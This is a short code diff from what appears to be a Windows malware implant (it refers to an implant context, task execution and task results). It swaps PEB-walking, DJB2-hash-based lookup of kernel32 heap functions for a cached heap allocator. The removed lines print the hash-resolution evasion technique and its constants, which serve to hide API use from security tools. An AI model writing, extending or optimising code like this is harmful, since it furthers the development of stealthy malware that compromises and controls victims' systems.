@@ -13,6 +13,7 @@
 #include "peb.h"
 #include "config.h"
 #include "task_exec.h"
+#include "heap.h"
 #include "bus.h"
 
 /* ------------------------------------------------------------------ */
@@ -138,37 +139,15 @@ static void store_task_result(IMPLANT_CONTEXT *ctx, const char *task_id,
 /*  Heap allocation via kernel32 HeapAlloc (PEB-resolved)              */
 /* ------------------------------------------------------------------ */
 
-typedef HANDLE (__attribute__((ms_abi)) *fn_GetProcessHeap)(void);
-typedef PVOID (__attribute__((ms_abi)) *fn_HeapAlloc)(HANDLE, DWORD, SIZE_T);
-typedef BOOL (__attribute__((ms_abi)) *fn_HeapFree)(HANDLE, DWORD, PVOID);
-
-/* DJB2 hashes for heap APIs */
-/* Computed: GetProcessHeap, HeapAlloc, HeapFree */
-#define HASH_GETPROCESSHEAP     0xDA077562
-#define HASH_HEAPALLOC          0xB1CE974E
-#define HASH_HEAPFREE           0xBF94BC05
+/* task_alloc / task_free now delegate to the cached heap (heap.c).
+   This avoids a PEB walk + export lookup on every allocation. */
 
 PVOID task_alloc(DWORD size) {
-    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
-    if (!k32) return NULL;
-    fn_GetProcessHeap pGetHeap = (fn_GetProcessHeap)find_export_by_hash(k32, HASH_GETPROCESSHEAP);
-    fn_HeapAlloc pAlloc = (fn_HeapAlloc)find_export_by_hash(k32, HASH_HEAPALLOC);
-    if (!pGetHeap || !pAlloc) return NULL;
-    HANDLE heap = pGetHeap();
-    if (!heap) return NULL;
-    /* HEAP_ZERO_MEMORY = 0x08 */
-    return pAlloc(heap, 0x08, size);
+    return heap_alloc_cached(size);
 }
 
 void task_free(PVOID ptr) {
-    if (!ptr) return;
-    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
-    if (!k32) return;
-    fn_GetProcessHeap pGetHeap = (fn_GetProcessHeap)find_export_by_hash(k32, HASH_GETPROCESSHEAP);
-    fn_HeapFree pFree = (fn_HeapFree)find_export_by_hash(k32, HASH_HEAPFREE);
-    if (!pGetHeap || !pFree) return;
-    HANDLE heap = pGetHeap();
-    if (heap) pFree(heap, 0, ptr);
+    heap_free_cached(ptr);
 }
 
 /* ------------------------------------------------------------------ */
